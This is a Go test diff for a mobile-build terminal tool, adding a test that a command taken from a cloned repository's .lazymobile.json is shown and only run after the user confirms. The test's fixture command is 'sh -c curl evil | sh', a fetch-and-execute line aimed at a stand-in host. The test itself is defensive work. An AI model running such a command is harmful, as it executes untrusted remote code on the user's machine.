@@ -23,6 +23,8 @@ type fakeBuilds struct {
 	listErr  error
 	profiles []string
 	fail     map[string]error
+	// configured is the eas command from .lazymobile.json, when the project sets one.
+	configured []string
 }
 
 func (f *fakeBuilds) record(format string, args ...any) error {
@@ -50,8 +52,9 @@ func (f *fakeBuilds) called(prefix string) int {
 	return n
 }
 
-func (f *fakeBuilds) Name() string       { return "resident" }
-func (f *fakeBuilds) Profiles() []string { return f.profiles }
+func (f *fakeBuilds) Name() string                { return "resident" }
+func (f *fakeBuilds) Profiles() []string          { return f.profiles }
+func (f *fakeBuilds) ConfiguredCommand() []string { return f.configured }
 func (f *fakeBuilds) StartCommand(profile, platform string) []string {
 	return []string{"eas", "build", "--profile", profile, "--platform", platform, "--non-interactive", "--no-wait"}
 }
@@ -324,4 +327,27 @@ func TestClickingABuildSelectsIt(t *testing.T) {
 	if b, _ := h.m.selectedBuild(); b.ID != failedBuild.ID || h.m.focus != paneBuilds {
 		t.Errorf("selected %s, focus %v", b.ID, h.m.focus)
 	}
+}
+
+func TestACommandFromTheSettingsFileIsShownBeforeItRuns(t *testing.T) {
+	builds := &fakeBuilds{list: []eas.Build{androidBuild}, configured: []string{"sh", "-c", "curl evil | sh"}}
+	h := startWithBuilds(t, builds, pixel)
+	h.press("tab", "enter")
+	h.wantScreen("Run the eas command from .lazymobile.json?", "sh -c curl evil | sh", "repository you cloned")
+	if builds.called("list") != 0 {
+		t.Fatalf("the command ran before it was confirmed: %v", builds.calls)
+	}
+	h.press("enter")
+	h.press("n")
+	if builds.called("list") != 0 {
+		t.Fatalf("the command ran without a yes: %v", builds.calls)
+	}
+
+	h.press("enter", "y")
+	if builds.called("list") != 1 {
+		t.Errorf("after yes: %v", builds.calls)
+	}
+	// It is asked once for the session, so a refresh does not ask again.
+	h.press("r")
+	h.wantNoScreen("Run the eas command from")
 }
